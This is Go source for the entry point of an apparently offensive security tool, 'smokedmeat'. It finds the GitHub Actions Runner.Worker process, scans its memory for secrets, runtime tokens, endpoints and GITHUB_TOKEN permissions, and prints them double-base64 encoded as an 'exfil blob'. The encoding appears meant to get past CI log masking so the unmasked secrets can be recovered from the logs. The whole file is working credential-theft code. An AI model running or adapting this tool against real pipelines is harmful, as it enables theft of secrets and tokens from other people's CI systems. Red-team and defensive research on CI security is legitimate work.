// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/boostsecurityio/smokedmeat/internal/gump"
)

type cliOptions struct {
	benchmark bool
	debug     bool
	probeOnly bool
	pidArg    string
}

type scanOutcome struct {
	unique map[string]bool
	counts map[gump.ResultType]int
	stats  *gump.ScanStats
	values map[string]debugValue
}

type debugValue struct {
	kind  string
	value string
}

var debugTargetNames = []string{
	"ACTIONS_RUNTIME_TOKEN",
	"ACTIONS_RESULTS_URL",
	"ACTIONS_CACHE_URL",
	"ACTIONS_RUNTIME_URL",
}

func main() {
	opts := parseArgs(os.Args[1:])

	time.Sleep(2 * time.Second)

	scanner := gump.GetScanner()

	pid := resolveTargetPID(scanner, opts)
	if pid > 0 {
		fmt.Printf("[*] Target PID: %d\n", pid)
	} else {
		fmt.Println("[*] Target PID: none")
	}

	if opts.debug {
		printDebugEnvironmentProbe(os.Stdout)
	}

	if opts.probeOnly {
		outcome := runProbe(pid, opts.debug)
		if opts.debug {
			fmt.Println("[*] Debug mode: raw result output and exfil blob suppressed.")
			printDebugSummary(os.Stdout, outcome)
			return
		}
		printExfilBlob(outcome.unique)
		return
	}

	if opts.benchmark {
		runBenchmark(scanner, pid)
		return
	}

	outcome := runScan(scanner, pid, opts.debug)
	if opts.debug {
		fmt.Println("[*] Debug mode: raw result output and exfil blob suppressed.")
		printDebugSummary(os.Stdout, outcome)
		return
	}
	printExfilBlob(outcome.unique)
}

func resolveTargetPID(scanner gump.Scanner, opts cliOptions) int {
	pid, findErr := scanner.FindPID()
	if findErr == nil {
		return pid
	}
	if opts.pidArg != "" {
		fmt.Printf("[!] Auto-detect failed (%v). Using provided PID.\n", findErr)
		if _, err := fmt.Sscanf(opts.pidArg, "%d", &pid); err != nil {
			fmt.Printf("[!] Invalid PID: %v\n", err)
			os.Exit(1)
		}
		return pid
	}
	if opts.probeOnly {
		fmt.Printf("[!] Could not find Runner.Worker PID: %v\n", findErr)
		return 0
	}
	fmt.Printf("[!] Could not find Runner.Worker PID: %v\n", findErr)
	os.Exit(1)
	return 0
}

func parseArgs(args []string) cliOptions {
	opts := cliOptions{}
	for _, arg := range args {
		switch arg {
		case "--benchmark":
			opts.benchmark = true
		case "--debug":
			opts.debug = true
		case "--probe-only":
			opts.probeOnly = true
		default:
			opts.pidArg = arg
		}
	}
	return opts
}

func runProbe(pid int, debug bool) scanOutcome {
	results := make(chan gump.Result, 100)
	outcome := scanOutcome{
		unique: make(map[string]bool),
		counts: make(map[gump.ResultType]int),
		values: make(map[string]debugValue),
	}

	gump.ProbeRuntimeContext(pid, results)
	close(results)
	consumeResults(results, &outcome, debug)
	return outcome
}

func runScan(scanner gump.Scanner, pid int, debug bool) scanOutcome {
	results := make(chan gump.Result, 100)
	var wg sync.WaitGroup
	outcome := scanOutcome{
		unique: make(map[string]bool),
		counts: make(map[gump.ResultType]int),
		values: make(map[string]debugValue),
	}

	var (
		stats   gump.ScanStats
		scanErr error
	)

	wg.Add(1)
	go func() {
		defer wg.Done()
		if debug {
			stats, scanErr = scanner.ScanWithStats(pid, results)
		} else {
			scanErr = scanner.Scan(pid, results)
		}
		if scanErr != nil {
			fmt.Printf("[!] Scan error: %v\n", scanErr)
		}
		close(results)
	}()

	consumeResults(results, &outcome, debug)

	wg.Wait()
	if debug {
		outcome.stats = &stats
	}
	return outcome
}

func consumeResults(results <-chan gump.Result, outcome *scanOutcome, debug bool) {
	for r := range results {
		if r.Raw != "" && !outcome.unique[r.Raw] {
			outcome.unique[r.Raw] = true
			outcome.counts[r.Type]++
			recordDebugValue(outcome.values, r)
			if !debug {
				switch r.Type {
				case gump.ResultTokenPermissions:
					printTokenPermissions(r)
				case gump.ResultVar:
					printVar(r)
				case gump.ResultEndpoint:
					printEndpoint(r)
				default:
					printSecret(r)
				}
			}
		}
	}
}

func printSecret(r gump.Result) {
	encoded := base64.StdEncoding.EncodeToString([]byte(r.Secret.Value))
	encoded = base64.StdEncoding.EncodeToString([]byte(encoded))
	fmt.Printf("[+] Found Secret: %s = %s (double-b64: %s)\n", r.Secret.Name, r.Secret.Value, encoded)
}

func printVar(r gump.Result) {
	fmt.Printf("[+] Found Var: %s = %s\n", r.Var.Name, r.Var.Value)
}

func printEndpoint(r gump.Result) {
	encoded := base64.StdEncoding.EncodeToString([]byte(r.Endpoint.Value))
	encoded = base64.StdEncoding.EncodeToString([]byte(encoded))
	fmt.Printf("[+] Found Endpoint: %s = %s (double-b64: %s)\n", r.Endpoint.EnvName, r.Endpoint.Value, encoded)
}

func printTokenPermissions(r gump.Result) {
	fmt.Println("[+] Found GITHUB_TOKEN Permissions:")

	var keys []string
	for k := range r.TokenPermissions {
		keys = append(keys, k)
	}
	sort.Strings(keys)

	for _, k := range keys {
		fmt.Printf("      %-20s %s\n", k+":", r.TokenPermissions[k])
	}
}

func runBenchmark(scanner gump.Scanner, pid int) {
	const iterations = 10

	fmt.Printf("\n[*] Running benchmark (%d iterations)...\n", iterations)
	fmt.Println(strings.Repeat("-", 40))

	var durations []time.Duration
	var secretCount int

	for i := 1; i <= iterations; i++ {
		results := make(chan gump.Result, 100)

		start := time.Now()
		go func() {
			_ = scanner.Scan(pid, results)
			close(results)
		}()

		secrets := make(map[string]bool)
		for r := range results {
			if r.Raw != "" {
				secrets[r.Raw] = true
			}
		}
		elapsed := time.Since(start)

		durations = append(durations, elapsed)
		secretCount = len(secrets)
		fmt.Printf("  [%2d] %v (%d secrets)\n", i, elapsed.Round(time.Millisecond), secretCount)
	}

	sort.Slice(durations, func(i, j int) bool { return durations[i] < durations[j] })

	var total time.Duration
	for _, d := range durations {
		total += d
	}
	avg := total / time.Duration(iterations)

	fmt.Println(strings.Repeat("-", 40))
	fmt.Printf("  Min:  %v\n", durations[0].Round(time.Millisecond))
	fmt.Printf("  Max:  %v\n", durations[iterations-1].Round(time.Millisecond))
	fmt.Printf("  Avg:  %v\n", avg.Round(time.Millisecond))
	fmt.Printf("  Total: %v\n", total.Round(time.Millisecond))
	fmt.Println(strings.Repeat("-", 40))
}

func printExfilBlob(secrets map[string]bool) {
	if len(secrets) == 0 {
		fmt.Println("[-] No secrets found.")
		return
	}

	fmt.Println("\n" + strings.Repeat("=", 30))
	fmt.Println("       EXTRACTED SECRETS")
	fmt.Println(strings.Repeat("=", 30))

	encoded := gump.EncodeSecrets(secrets)
	fmt.Println("[*] Encoded Blob (Decode this to see unmasked secrets):")
	fmt.Println(encoded)
}

func printDebugEnvironmentProbe(w io.Writer) {
	fmt.Fprintln(w, "\n[*] Debug: Current Environment Probe")
	for _, name := range debugTargetNames {
		fmt.Fprintf(w, "      %-28s %s\n", name+":", formatEnvProbeValue(name))
	}
}

func printDebugSummary(w io.Writer, outcome scanOutcome) {
	fmt.Fprintln(w, "\n[*] Debug: Scan Stats")
	if outcome.stats != nil {
		fmt.Fprintf(w, "      %-28s %d\n", "regions_scanned:", outcome.stats.RegionsScanned)
		fmt.Fprintf(w, "      %-28s %d\n", "bytes_read:", outcome.stats.BytesRead)
		fmt.Fprintf(w, "      %-28s %d\n", "read_errors:", outcome.stats.ReadErrors)
	}

	fmt.Fprintln(w, "\n[*] Debug: Result Counts")
	fmt.Fprintf(w, "      %-28s %d\n", "secrets:", outcome.counts[gump.ResultSecret])
	fmt.Fprintf(w, "      %-28s %d\n", "vars:", outcome.counts[gump.ResultVar])
	fmt.Fprintf(w, "      %-28s %d\n", "permissions:", outcome.counts[gump.ResultTokenPermissions])
	fmt.Fprintf(w, "      %-28s %d\n", "endpoints:", outcome.counts[gump.ResultEndpoint])

	fmt.Fprintln(w, "\n[*] Debug: Runtime Targets")
	for _, name := range debugTargetNames {
		value, ok := outcome.values[name]
		if !ok {
			fmt.Fprintf(w, "      %-28s absent\n", name+":")
			continue
		}
		fmt.Fprintf(w, "      %-28s found-as-%s %s\n", name+":", value.kind, formatDebugValue(value.value))
	}
}

func formatEnvProbeValue(name string) string {
	value := strings.TrimSpace(os.Getenv(name))
	if value == "" {
		return "absent"
	}
	return formatDebugValue(value)
}
